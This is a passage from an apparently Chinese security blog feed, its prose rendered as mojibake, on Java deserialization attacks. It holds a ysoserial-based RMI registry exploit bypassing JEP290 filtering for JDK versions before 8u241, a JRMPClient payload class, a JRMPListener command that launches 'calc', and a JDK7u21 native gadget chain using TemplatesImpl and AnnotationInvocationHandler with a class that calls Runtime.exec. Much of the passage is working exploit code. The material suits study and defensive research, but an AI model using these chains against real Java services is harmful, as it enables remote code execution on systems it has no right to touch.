href="https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/">https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.exploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.JRMPClient_bypass_jep_jdk231;</span><br><span class="line"><span class="keyword">import</span> ysoserial.secmgr.ExecCheckingSecurityManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIRegistryExploit_bypass_jep_jdk231</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">TrustAllSSL</span> <span class="keyword">implements</span> <span class="title class_">X509TrustManager</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> X509Certificate[] ANY_CA = &#123;&#125;;</span><br><span class="line">        <span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123; <span class="keyword">return</span> ANY_CA; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(<span class="keyword">final</span> X509Certificate[] c, <span class="keyword">final</span> String t)</span> &#123; <span class="comment">/* Do nothing/accept all */</span> &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkClientTrusted</span><span class="params">(<span class="keyword">final</span> X509Certificate[] c, <span class="keyword">final</span> String t)</span> &#123; <span class="comment">/* Do nothing/accept all */</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">RMISSLClientSocketFactory</span> <span class="keyword">implements</span> <span class="title class_">RMIClientSocketFactory</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> Socket <span class="title function_">createSocket</span><span class="params">(String host, <span class="type">int</span> port)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">SSLContext</span> <span class="variable">ctx</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">                ctx.init(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">TrustManager</span>[] &#123;<span class="keyword">new</span> <span class="title class_">TrustAllSSL</span>()&#125;, <span class="literal">null</span>);</span><br><span class="line">                <span class="type">SSLSocketFactory</span> <span class="variable">factory</span> <span class="operator">=</span> ctx.getSocketFactory();</span><br><span class="line">                <span class="keyword">return</span> factory.createSocket(host, port);</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;192.168.2.4&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> Integer.parseInt(<span class="string">&quot;1099&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;192.168.2.4:2333&quot;</span>;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(host, port);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            registry.list();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ConnectIOException ex) &#123;</span><br><span class="line">            registry = LocateRegistry.getRegistry(host, port, <span class="keyword">new</span> <span class="title class_">RMISSLClientSocketFactory</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ensure payload doesn&#x27;t detonate during construction or deserialization</span></span><br><span class="line">        exploit(registry, command);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exploit</span><span class="params">(<span class="keyword">final</span> Registry registry,  <span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ExecCheckingSecurityManager</span>().callWrapped(<span class="keyword">new</span> <span class="title class_">Callable</span>&lt;Void&gt;()&#123;<span class="keyword">public</span> Void <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JRMPClient_bypass_jep_jdk231</span>().getObject(command);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                JEP_Naming.lookup(registry, remote);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient_bypass_jep_jdk241</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Remote&gt; &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> Remote <span class="title function_">getObject</span> <span class="params">(<span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> </span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"> </span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>((RemoteRef) ref);</span><br><span class="line">        <span class="type">RMIServerSocketFactory</span> <span class="variable">serverSocketFactory</span> <span class="operator">=</span> (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">            RMIServerSocketFactory.class.getClassLoader(),<span class="comment">// classloader</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; RMIServerSocketFactory.class, Remote.class&#125;, <span class="comment">// interfaces to implements</span></span><br><span class="line">            handler<span class="comment">// RemoteObjectInvocationHandler</span></span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// UnicastRemoteObject constructor is protected. It needs to use reflections to new a object</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(<span class="literal">null</span>); <span class="comment">// è·å–é»˜è®¤çš„</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRemoteObject</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (UnicastRemoteObject) constructor.newInstance(<span class="literal">null</span>);</span><br><span class="line">        Reflections.setFieldValue(remoteObject, <span class="string">&quot;ssf&quot;</span>, serverSocketFactory);</span><br><span class="line">        <span class="keyword">return</span> remoteObject;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient_bypass_jep_jdk231.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient_bypass_jep_jdk231.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-<span class="number">0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener <span class="number">2333</span> CommonsCollections5 <span class="string">&quot;calc&quot;</span></span><br></pre></td></tr></table></figure><p>å†è¿è¡Œysoserial.exploit.RMIRegistryExploit_bypass_jep_jdk241.javaè¿›è¡Œæ”»å‡»</p><h3 id="8u241"><a href="#8u241" class="headerlink" title="8u241"></a>8u241</h3><p>é«˜äºè¿™ä¸ªç‰ˆæœ¬æ‰“ä¸äº†</p><p>æ¯”å¦‚shiroå‘ä¸äº†æ•°ç»„ï¼Œå°±èƒ½JRMPæ‰“</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> RMI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaåŸç”ŸRCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7u21&amp;8u20ååºåˆ—åŒ–</title>
      <link href="/2024/09/18/jdk7u21-jdk8u20-yuan-sheng-unserialize/"/>
      <url>/2024/09/18/jdk7u21-jdk8u20-yuan-sheng-unserialize/</url>
      
        <content type="html"><![CDATA[<p>ä»…éœ€JDKåœ¨æŒ‡å®šç‰ˆæœ¬ï¼Œæœ‰ååºåˆ—åŒ–å…¥å£ï¼Œä½†æ— éœ€å…¶ä»–çš„ä¾èµ–åŒ…æ¯”å¦‚CCï¼ŒCBèƒ½å¦ç›´æ¥æ‰“å…¥ååºåˆ—åŒ–ï¼Ÿ</p><p>å…¶ä¸­ä¸€ä¸ªç­”æ¡ˆå°±æ˜¯javaåŸç”Ÿååºåˆ—åŒ–é“¾JDK7u21</p><h1 id="jdk7u21åŸç”Ÿååºåˆ—åŒ–"><a href="#jdk7u21åŸç”Ÿååºåˆ—åŒ–" class="headerlink" title="jdk7u21åŸç”Ÿååºåˆ—åŒ–"></a>jdk7u21åŸç”Ÿååºåˆ—åŒ–</h1><p>æ²¡æœ‰CCä¾èµ–ï¼Œé‚£ä¹‹å‰çš„InvokerTransformerï¼ŒchainedTransformerï¼ŒLazyMapç­‰éƒ½ä¸èƒ½ä½¿ç”¨äº†ã€‚</p><p>ä¸èƒ½ç”¨InvokerTransformerï¼Œé‚£å°±ä¸èƒ½ç”¨Runtime.execï¼Œåªèƒ½çœ‹æ˜¯å¦èƒ½åŠ¨æ€åŠ è½½å­—èŠ‚ç ã€‚è¿›è€Œæƒ³åˆ°TemplatesImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">    <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">            field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">            field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">            field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦è§¦å‘åˆ°templatesClass.newTransformer()</p><h2 id="source-equalsImpl"><a href="#source-equalsImpl" class="headerlink" title="source:equalsImpl"></a>source:equalsImpl</h2><p>æ¼æ´ç‚¹ï¼šåœ¨7u21çš„AnnotationInvocationHandler.equalsImpl()ä¸­invokeå¯ä»¥åå°„è°ƒç”¨å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240909152646822.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240909152646822.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†æ˜¯ä¸ºäº†é¡ºåˆ©èµ°åˆ°<code>var5.invoke(var1)</code>éœ€è¦èµ°è¿‡å‰é¢çš„ä¸‰ä¸ªif</p><ul><li>var1ä¸æ˜¯AnnotationInvocationHandlerå¯¹è±¡è‡ªèº«</li><li>var1éœ€è¦æ˜¯this.typeç±»å‹çš„å®ä¾‹ï¼Œä¹Ÿå°±æ˜¯ç»§æ‰¿äº†Annotationæˆ–æœ¬èº«å°±æ˜¯Annotation</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240909153325588.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240909153325588.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li><p>elseé‡Œçš„ä»£ç é€»è¾‘ï¼š</p></li><li><ul><li>getMemberMethodsè·å–äº†typeæ¥å£ä¸‹çš„æ‰€æœ‰æ–¹æ³•ï¼Œå­˜å‚¨åˆ°var2ã€‚å¦‚æœè¿™é‡Œthis.typeæ˜¯Templatesæ¥å£ï¼Œé‚£å°±è·å–äº†Templatesæ¥å£çš„æ‰€æœ‰æ–¹æ³•</li><li><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240909153630206.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240909153630206.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li><li><code>this.asOneOfUs(var1) == null</code>æ—¶ï¼Œå¾ªç¯è°ƒç”¨var5.invoke(var1)ã€‚var5å°±æ˜¯å¾ªç¯è°ƒç”¨çš„equalsï¼ŒhashCodeï¼ŒtoStringï¼ŒannotationTypeã€‚</li></ul></li></ul><p>asOneOfUsåˆ¤æ–­äº†var1æ˜¯å¦ä¸ºä»£ç†ç±»å®ä¾‹ï¼Œä¹Ÿå°±æ˜¯æ˜¯å¦ä¸ºProxy.creatProxyåˆ›å»ºçš„å¯¹è±¡ï¼Œè¿™é‡Œä¼ è¿›å»TemplatesImplå¯¹è±¡ï¼Œæ‰€ä»¥ä¸æ˜¯</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240909154937700.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240909154937700.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>è‰ï¼è®°å¾—æ”¹ä¾èµ–SDK</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240909161659596.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240909161659596.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></blockquote><p>è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼š</p><p>ä¸ºä»€ä¹ˆç›´æ¥å‘æ„é€ å‡½æ•°ä¼ å…¥Templates.classä¸ä¼šæŠ¥é”™ï¼Ÿè¿™é‡Œä¸ä¼ Annotationçš„å­ç±»ä¸ºå•¥ä¸æŠ¥é”™</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910195949562.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910195949562.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç™¾åº¦æ³›å‹æ“¦é™¤</p><p>æ­£ç¡®çš„æ–¹æ³•æ˜¯å…ˆéšä¾¿ä¼ ä¸ªæ³¨è§£ç±»å†åå°„ä¿®æ”¹ä¸ºTemplatesæ¥å£ã€‚è¿™é‡Œtypeæ˜¯privite finalã€‚å…³äºfinalä¿®é¥°ç¬¦çš„é—®é¢˜è¯·è§</p><p><a href="https://godownio.github.io/2024/07/20/lei-urldns-de-cc6/#%E4%BF%AE%E6%94%B9final%E5%AD%97%E6%AE%B5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5">https://godownio.github.io/2024/07/20/lei-urldns-de-cc6/#%E4%BF%AE%E6%94%B9final%E5%AD%97%E6%AE%B5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5</a></p><p>ä»equalsImplæµ‹è¯•ä»£ç ï¼š</p><p>Evilcode:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeEvil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RuntimeEvil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDK7u21</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\codecollect\\RMIServer\\RMIServer\\target\\classes\\org\\example\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> constructor.newInstance(Override.class, map);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">typeField</span> <span class="operator">=</span> annotationInvocationHandler.getClass().getDeclaredField(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">        typeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        typeField.set(annotationInvocationHandler, Templates.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;equalsImpl&quot;</span>, Object.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(annotationInvocationHandler, templatesClass);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910202515078.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910202515078.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="åŠ¨æ€ä»£ç†è§¦å‘equalsImpl"><a href="#åŠ¨æ€ä»£ç†è§¦å‘equalsImpl" class="headerlink" title="åŠ¨æ€ä»£ç†è§¦å‘equalsImpl"></a>åŠ¨æ€ä»£ç†è§¦å‘equalsImpl</h2><p>å­¦è¿‡CC1éƒ½çŸ¥é“ï¼ŒAnnotationInvocationHandleræ˜¯ä¸ªåŠ¨æ€ä»£ç†ç±»ï¼Œç”¨è¿™ä¸ªç±»ä»£ç†å…¶ä»–ç±»ï¼Œæ‰§è¡Œæ–¹æ³•æ—¶ä¼šè·³è½¬è‡³AnnotationInvocationHandler.invoke</p><p>å¦‚æœæ»¡è¶³ï¼š</p><ul><li>æ–¹æ³•åæ˜¯equals</li><li>å‚æ•°åªæœ‰ä¸€ä¸ª</li><li>ç¬¬ä¸€ä¸ªå‚æ•°ç±»å‹æ˜¯Object.class</li></ul><p>å°±ä¼šæ‰§è¡ŒequalsImpl</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910202937471.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910202937471.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä»€ä¹ˆåœ°æ–¹è°ƒç”¨åˆ°äº†equalså‘¢ï¼Ÿ</p><p>å¾ˆå®¹æ˜“æƒ³åˆ°HashMapã€‚åœ¨HashMapçš„putæ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†equalsã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910204239313.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910204239313.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™é‡Œçš„equalsåˆšå¥½æ»¡è¶³ä¸Šé¢ifå†…çš„ä¸‰ä¸ªæ¡ä»¶</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910204500885.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910204500885.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™é‡Œï¼Œkeyå€¼ä¸ºAnnotationInvocationHandlerä»£ç†ç±»ï¼Œkä¸ºtemplatesImplæ¶æ„å­—èŠ‚ç å¯¹è±¡ï¼Œå°±èƒ½æ‰§è¡Œæ¶æ„ä»£ç 